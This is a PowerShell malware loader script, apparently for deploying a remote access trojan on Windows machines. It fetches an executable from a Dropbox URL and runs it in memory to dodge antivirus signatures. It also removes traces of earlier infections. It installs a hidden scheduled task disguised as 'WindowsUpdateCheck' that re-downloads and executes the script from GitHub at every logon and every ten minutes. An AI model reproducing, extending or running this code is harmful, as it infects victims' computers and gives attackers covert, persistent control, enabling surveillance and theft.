# ==========================================
# FINAL INVISIBLE LOADER (Stable & Clean)
# ==========================================

# --- CONFIGURATION ---
$PayloadUrl = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'
$GitHubUrl  = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/deploy%20invisible.ps1'
$TaskName   = "WindowsUpdateCheck"

# --- 1. CLEANUP (Removes old popups & traces) ---
Write-Host "Cleaning up old traces..." -F Gray
try {
    # Remove the registry keys that caused white windows
    Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
    Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
    Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSystemInit" -ErrorAction SilentlyContinue

    # Kill any leftover mshta processes
    Stop-Process -Name "mshta" -Force -ErrorAction SilentlyContinue
    
    # Remove old tasks
    Unregister-ScheduledTask -TaskName "MicrosoftWindowsUpdater" -Confirm:$false -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "SystemHealthCheck" -Confirm:$false -ErrorAction SilentlyContinue
} catch {}

# --- 2. EXECUTION FUNCTION (Fileless / RAM Only) ---
function Run-Payload {
    Write-Host "Attempting Fileless Load..." -F Gray
    try {
        # Download bytes to Memory
        $wc = New-Object System.Net.WebClient
        $bytes = $wc.DownloadData($PayloadUrl)
        
        # Load Assembly (Using AppDomain to avoid simple signatures)
        $assembly = [System.AppDomain]::CurrentDomain.Load($bytes)
        
        # Run EntryPoint
        $entry = $assembly.EntryPoint
        if ($entry) {
            $entry.Invoke($null, $null)
            Write-Host "✅ Payload Running (Hidden)" -F Green
        }
    } catch {
        Write-Host "⚠️ Execution Failed (AV Blocked)" -F Red
    }
}

# --- 3. PERSISTENCE (The "Zombie" Task) ---
# This task re-downloads THIS script from GitHub every startup.
try {
    $exists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if (-not $exists) {
        # Action: PowerShell downloads GitHub script -> IEX
        $cmd = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr '$GitHubUrl' | iex`""
        
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$cmd`""
        
        # Trigger: At Logon + Every 10 Minutes
        $Trigger1 = New-ScheduledTaskTrigger -AtLogon
        $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)
        
        # Principal: Run as USER (Interactive) but Hidden. 
        # (This is better than SYSTEM for RATs because it can see the screen).
        $Principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
        
        # Settings: Hidden, don't stop on battery
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
        
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
        Write-Host "✅ Persistence Installed: $TaskName" -F Green
    }
} catch {
    Write-Host "⚠️ Persistence Failed" -F Red
}

# --- 4. START ---
Run-Payload
